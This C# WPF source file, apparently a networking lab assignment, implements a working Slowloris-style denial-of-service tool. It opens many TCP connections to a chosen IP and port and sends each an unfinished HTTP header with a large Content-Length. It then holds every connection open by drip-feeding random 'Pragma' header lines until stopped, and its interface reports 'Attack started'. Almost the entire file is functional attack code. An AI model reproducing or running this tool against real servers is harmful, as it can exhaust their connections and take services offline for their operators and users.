using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace lab6PR
{
	/// <summary>
	/// Interaction logic for MainWindow.xaml
	/// </summary>
	public partial class MainWindow : Window
	{
		bool isAttacking; 
		
		public MainWindow()
		{
			InitializeComponent();
		}

		private async void Button_Start(object sender, RoutedEventArgs e)
		{
			if (URL.Text!=null && port.Text!=null && nr_of_connection.Text!=null && timeout.Text!=null)
			{
				start.Visibility = Visibility.Collapsed;
				stop.Visibility = Visibility.Visible;
				isAttacking = true;
				status.Text = "Attack started";
				status.Foreground = Brushes.Green;
				try
				{
					await start_attack(URL.Text, Int32.Parse(port.Text), Int32.Parse(nr_of_connection.Text), Int32.Parse(timeout.Text));
				}
					catch (FormatException)
				{
					status.Text = "Wrong address, Stop and try another one!";
					status.Foreground = Brushes.Red;
				}
				catch (SocketException)
				{
					status.Text = "Connection limit exceeded or wrong port, Stop and try again!";
					status.Foreground = Brushes.Red;
				}
				catch (OutOfMemoryException)
				{
					status.Text = "Out of range numbers, Stop and try less!";
					status.Foreground = Brushes.Red;
				}
				catch (OverflowException)
				{
					status.Text = "Out of range numbers, Stop and try less!";
					status.Foreground = Brushes.Red;
				}
				catch (ArgumentOutOfRangeException)
				{
					status.Text = "Wrong port, Stop and try another one!";
					status.Foreground = Brushes.Red;
				}
			}
		}

		private async Task start_attack(string hostName, int hostPort, int numberConnections, int timeout)
		{

			await Task.Delay(100);
			IPAddress host = IPAddress.Parse(hostName);
			IPEndPoint hostEndpoint = new IPEndPoint(host, hostPort);
			List<Socket> socket_list = new List<Socket>();
			byte[] buffer = new byte[512];
			string request = "GET / HTTP/1.1\r\nHost: " + hostName + "\r\nConnection: keep-alive\r\n"+
				"Accept: text/html\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;"+
				".NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"+
				"Content-Length: 2000000 \r\n";

			buffer = Encoding.UTF8.GetBytes(request);

			for (int i = 0; i < numberConnections; i++)
			{
				var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				try
				{
					socket.Connect(hostEndpoint);
					socket.Send(buffer);
					socket_list.Add(socket); 
				}
				catch
				{
					break; 
				}
			}

			System.Diagnostics.Process.Start("http://"+hostName+":"+hostPort);
			Random r = new Random();
			while(isAttacking)
			{
				buffer = Encoding.UTF8.GetBytes("Pragma: " + r.Next(1000000));
				foreach(Socket currentSocket in socket_list)
				{
					currentSocket.Send(buffer);
				}
				Console.WriteLine(Encoding.ASCII.GetString(buffer)); 
				await Task.Delay(timeout);
			}

			foreach(Socket currentSocket in socket_list)
			{
				currentSocket.Close();
			}
		}


		private void NumberValidationTextBox(object sender, TextCompositionEventArgs e)
		{
			Regex regex = new Regex("[^0-9]+");
			e.Handled = regex.IsMatch(e.Text);
		}


		private async void Button_Stop(object sender, RoutedEventArgs e)
		{
			await Task.Delay(100);
			stop.Visibility = Visibility.Collapsed;
			start.Visibility = Visibility.Visible;
			isAttacking = false;
			status.Text = "Attack stopped!";
			status.Foreground = Brushes.Green;
		}
	}

	
}
